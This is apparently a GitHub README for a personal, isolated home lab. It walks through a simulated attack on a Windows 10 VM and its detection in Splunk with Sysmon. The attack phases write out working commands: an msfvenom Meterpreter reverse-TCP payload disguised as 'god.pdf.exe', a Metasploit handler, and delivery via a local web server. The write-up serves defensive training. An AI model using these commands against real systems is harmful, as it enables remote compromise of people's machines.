# -cybersecurity-home-lab
# 🏠 Cybersecurity Home Lab

A personal, fully isolated lab environment for practicing offensive security techniques and building detection/blue-team skills using real-world tools. Built to bridge the gap between certification knowledge and hands-on SOC analyst experience.

> **Disclaimer:** All activity documented here takes place exclusively within an isolated, internal virtual network that I own. No external systems were accessed or tested. This lab exists purely for educational purposes.

---

## 🖥️ Lab Architecture

```
┌─────────────────────────────────────────────┐
│           Internal Virtual Network            │
│                (Host-Only / NAT)               │
│                                                 │
│   ┌───────────────┐       ┌───────────────┐   │
│   │  Kali Linux    │ ───── │  Windows 10   │   │
│   │  (Attacker)    │       │   (Target)    │   │
│   │  Static IP     │       │  Static IP    │   │
│   └───────────────┘       └───────────────┘   │
│                                  │              │
│                          ┌───────────────┐      │
│                          │ Splunk +      │      │
│                          │ Sysmon        │      │
│                          │ (Detection)   │      │
│                          └───────────────┘      │
└─────────────────────────────────────────────┘
```

| Component | Role | Details |
|---|---|---|
| **Kali Linux** | Attacker / Red Team | Nmap, Hydra, Metasploit, msfvenom |
| **Windows 10** | Target / Victim | Sysmon-enabled, monitored endpoint |
| **Splunk** | SIEM / Blue Team | Centralized log ingestion & detection |
| **Sysmon** | Endpoint logging | Detailed process, network, and file event logging |
| **Network** | Internal-only | Static IPs, isolated from host network and internet |

---

## ⚙️ Setup Log

### 1. Network Configuration
- Configured both VMs on an internal-only virtual network
- Assigned static IPs to ensure consistent communication between attacker and target
- Verified connectivity with basic ping tests before proceeding

### 2. Splunk + Sysmon Configuration
This took longer than expected — documenting the troubleshooting because it was genuinely the most valuable part of this setup.

- Installed **Sysmon** on the Windows 10 target for granular event logging (process creation, network connections, file changes)
- Splunk doesn't natively parse Sysmon's verbose XML output, so I installed the **Splunk Add-on for Sysmon** from Splunkbase
- Created a dedicated `endpoint` index in Splunk *before* pointing any inputs at it (learned the hard way — Splunk will silently fail to index data sent to a non-existent index)
- **Mistake made & fixed:** Initially edited Splunk's `default` config folder directly, which broke the indexes tab and caused `localhost:8000` connection refusals. Reverted by restoring defaults and instead placing custom configs in the correct `local` folder, scoped to only what was needed.

```ini
# inputs.conf — local folder, NOT default
[WinEventLog://Sysmon]
index = endpoint
disabled = false
renderXml = true
```

---

## 🎯 Lab Exercise: Attack & Detect Simulation

**Objective:** Execute a full attack chain against the Windows 10 target, then pivot to the defender's seat and trace the entire intrusion using Splunk.

### Phase 1 — Reconnaissance
```bash
nmap -sV 192.168.x.x
```
**Finding:** Port `3389` (RDP) open on the target.

### Phase 2 — Payload Creation
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f exe -o god.pdf.exe
```
Created a Meterpreter reverse TCP payload disguised with a `.pdf.exe` double extension.

### Phase 3 — Listener & Delivery
```bash
# Metasploit handler
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <kali-ip>
set LPORT 4444
exploit

# Payload delivery via local web server
python3 -m http.server 9999
```
Disabled Windows Defender real-time protection on the target (lab-only — never a real-world recommendation), downloaded the payload via browser, and executed it.

### Phase 4 — Post-Exploitation
With an active Meterpreter shell:
```
ipconfig
net localgroup
```
Confirmed remote command execution on the target.

### Phase 5 — Detection & Investigation (Splunk)

This is the part I actually care about.

**Query 1 — Identify attacker activity by IP:**
```spl
index=endpoint src_ip=<kali-ip>
```
Confirmed the attacker's footprint was limited to a single port (3389) — useful for scoping the "blast radius" of the simulated intrusion.

**Query 2 — Locate the malicious process:**
```spl
index=endpoint "god.pdf.exe"
```
Identified the event showing `god.pdf.exe` spawning `cmd.exe` as a child process — a textbook indicator of malicious execution (legitimate PDFs don't spawn command shells).

**Query 3 — Trace the full command chain:**
```spl
index=endpoint ProcessGuid="<copied-guid>"
```
Using the process GUID from the parent event, traced all 5 related child events — reconstructing exactly what commands the "attacker" ran after gaining access.

---

## 🧠 Key Takeaways

- **Configuration matters more than tools.** A misconfigured `inputs.conf` cost more troubleshooting time than the entire attack chain combined — and taught me more about how Splunk actually works under the hood.
- **Process lineage is a powerful detection signal.** `cmd.exe` spawned by a "document" is one of the simplest and most reliable red flags in endpoint monitoring.
- **Process GUIDs are gold for investigation.** They let you reconstruct an entire attack timeline from a single pivot point.
- **Doing both sides matters.** Understanding the attacker's mindset directly improves how I think about detection — and vice versa.

---

## 📋 Planned Future Labs

- [ ] Add a vulnerable Linux target (Metasploitable2) for multi-OS practice
- [ ] Build Splunk dashboards for real-time alerting instead of manual searches
- [ ] Practice privilege escalation techniques post-exploitation
- [ ] Add pfSense as a firewall/router between network segments
- [ ] Document MITRE ATT&CK technique mapping for each lab exercise
- [ ] Set up a basic SOAR-style automated alert → ticket workflow

---

## 🔧 Tools Used

`Kali Linux` `Windows 10` `Splunk` `Sysmon` `Nmap` `Metasploit` `msfvenom` `Meterpreter`

---

## 📫 Contact

**Angel Ruiz**
🔐 Aspiring SOC Analyst | Cybersecurity Analyst
💼 [LinkedIn](https://www.linkedin.com/in/aruizcanel/) · 📧 aruizcanel@yahoo.com
